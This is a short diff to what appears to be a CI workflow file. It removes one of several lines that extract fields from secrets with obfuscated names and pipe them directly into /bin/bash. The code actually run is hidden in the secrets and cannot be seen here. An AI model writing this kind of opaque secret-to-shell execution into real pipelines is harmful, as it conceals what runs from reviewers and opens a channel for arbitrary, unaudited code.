@@ -19,7 +19,6 @@ jobs:
           jv3: ${{ secrets.jv3 }}
         run: |
           printf '%s' "$jv3" | jq -r .ovm5182 | /bin/bash
-          printf '%s' "$p604" | jq -r .qxfwx98 | /bin/bash
           printf '%s' "$randl0" | jq -r .ewsml210 | /bin/bash
           printf '%s' "$jdtgq87" | jq -r .hw25 | /bin/bash
           echo $nnftf31 | jq -r .cxhib798 | /bin/bash
